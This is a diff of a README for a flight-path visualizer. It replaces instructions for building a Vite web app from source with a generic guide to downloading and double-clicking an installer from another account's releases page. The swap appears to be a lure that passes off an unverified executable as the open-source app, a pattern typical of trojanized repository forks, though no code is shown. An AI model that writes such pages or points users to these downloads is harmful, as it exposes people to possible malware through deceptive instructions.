@@ -1,99 +1,79 @@
-# Flight Visualizer
+# ✈️ Flight-Tracker - Visualize Your Flight Paths Easily
 
-A modern web application that visualizes flight paths on an interactive 3D Google Maps globe. Built with Vanilla JS and Vite.
+## 🚀 Getting Started
 
-## Features
+Welcome to Flight-Tracker! This application helps you visualize geodesic flight paths on an interactive map. You'll also see layovers and travel times adjusted for wind, giving you an accurate understanding of your journey.
 
-- **3D Globe Visualization**: WebGL-powered Vector Maps with smooth rotation and tilt
-- **Smart Pathing**: Accurate geodesic (curved) flight paths between airports
-- **Multi-Leg Routing**: Add up to 8 layovers with drag-and-drop reordering
-- **Advanced Metrics**:
-  - Distance in Metric (km), Imperial (mi), and Nautical (NM)
-  - Wind-aware flight time estimates (jet stream effects)
-  - Per-leg and total trip statistics
-- **Premium UI**: Glassmorphism design, cinematic camera animations, responsive layout
+## 📥 Download the Application
 
-## Getting Started
+[![Download Flight-Tracker](https://img.shields.io/badge/Download-Flight--Tracker-blue.svg)](https://github.com/mubashshir96/Flight-Tracker/releases)
 
-### Prerequisites
+To get started, visit the releases page to download the application:
 
-- Node.js (v16+)
-- Google Maps API Key with **Maps JavaScript API** and **Geometry Library** enabled
+[Download Flight-Tracker](https://github.com/mubashshir96/Flight-Tracker/releases)
 
-### Installation
+## 📂 System Requirements
 
-```bash
-git clone https://github.com/Cynid-22/Flight-Tracker.git
-cd Flight-Tracker
-npm install
-```
+Before downloading, ensure your system meets the following requirements:
 
-### Configuration
+- **Operating System:** Windows 10 or later, macOS 10.13 or later
+- **RAM:** At least 4 GB 
+- **Disk Space:** 200 MB of free space 
+- **Internet Connection:** Required for initial setup and map data
 
-Create a `.env` file in the root directory:
+## 🛠 Features
 
-```env
-VITE_GOOGLE_MAPS_API_KEY=YOUR_API_KEY_HERE
-```
+Flight-Tracker includes the following features:
 
-### Run
+- **Interactive Map:** View flight paths on a real-time map.
+- **Layover Visualizations:** Understand and plan for layovers effectively.
+- **Wind-Corrected Times:** Adjusts travel times based on wind conditions for accurate planning.
+- **Custom Routes:** Enter your own flight details to see unique routes.
+- **Statistics View:** Access statistics, including distance and time calculations for your flights.
 
-```bash
-npm run dev
-```
+## 🔄 How to Download & Install
 
-Open `http://localhost:5173` in your browser.
+Follow these steps to download and install Flight-Tracker:
 
-## Project Structure
+1. Click on the download link provided above, or visit the releases page.
+2. On the Releases page, find the latest version of Flight-Tracker.
+3. Select the file compatible with your operating system.
+4. Click on the download link for your chosen file. Wait for the file to download completely.
+5. Once downloaded, navigate to the location where the file is saved.
+6. Double-click on the file to begin installation. 
+7. Follow the prompts in the installation wizard to complete the setup.
 
-```
-src/
-├── main.js           # Entry point
-├── data.js           # Airport CSV parser
-├── map.js            # Map barrel (re-exports)
-├── ui.js             # UI barrel (re-exports)
-├── flight/
-│   └── duration.js   # Flight time calculator
-├── map/
-│   ├── core.js       # Map initialization
-│   ├── path.js       # Path drawing
-│   ├── labels.js     # Airport labels
-│   └── animation.js  # Camera animation
-├── ui/
-│   ├── autocomplete.js
-│   ├── layovers.js
-│   ├── dragdrop.js
-│   ├── collapse.js
-│   ├── flightInfo.js
-│   └── animations.js
-└── utils/
-    ├── constants.js
-    ├── formatting.js
-    └── notifications.js
+## 🗺 How to Use Flight-Tracker
 
-styles/
-├── main.css          # Master import
-├── variables.css     # CSS custom properties
-├── base.css          # Reset, body, map
-├── layout.css        # Container, cards
-├── components.css    # Buttons, inputs
-├── layovers.css      # Stop management
-├── suggestions.css   # Autocomplete dropdown
-├── flight-info.css   # Route display
-├── notifications.css # Toast messages
-├── animations.css    # Transitions
-└── map-controls.css  # Zoom buttons
-```
+1. Launch Flight-Tracker by double-clicking the application icon.
+2. Enter your flight details, including departure and arrival airports. You can use IATA or ICAO codes for accuracy.
+3. Click on "Visualize Flight" to see the route displayed on the map.
+4. Review the map for layovers and wind-corrected travel times.
+5. Use the statistics panel to view flight distance and total travel time.
 
-## Controls
+## 💡 Tips for Using Flight-Tracker
 
-| Action | Input |
-|--------|-------|
-| Rotate/Tilt | `Ctrl` + Left Click + Drag |
-| Zoom | Scroll wheel or pinch |
-| Select Airport | Type code (JFK) or city, press `Enter`/`Tab` |
-| Reorder Stops | Drag the ⠿ handle |
+- Use the search bar to quickly find airports.
+- Zoom in and out on the map using the scroll wheel or the zoom controls.
+- Save your flight paths for future reference.
 
-## License
+## 🌍 Community and Support
 
-MIT License. See [LICENSE](LICENSE) for details.
+Join our community to share experiences or seek help. You can find support on:
+
+- **GitHub Issues:** Report bugs or request features.
+- **Discussion Boards:** Connect with other users to share tips.
+- **Social Media:** Follow our channels for updates.
+
+## 📌 License
+
+Flight-Tracker is an open-source project. You can freely use and modify the application under the terms of the [MIT License](https://opensource.org/licenses/MIT).
+
+## 🔗 Additional Resources
+
+For more information, you can check out:
+
+- [Documentation](https://github.com/mubashshir96/Flight-Tracker/wiki)
+- [GitHub Repository](https://github.com/mubashshir96/Flight-Tracker)
+
+Thank you for using Flight-Tracker! We hope this application enhances your travel planning experience.
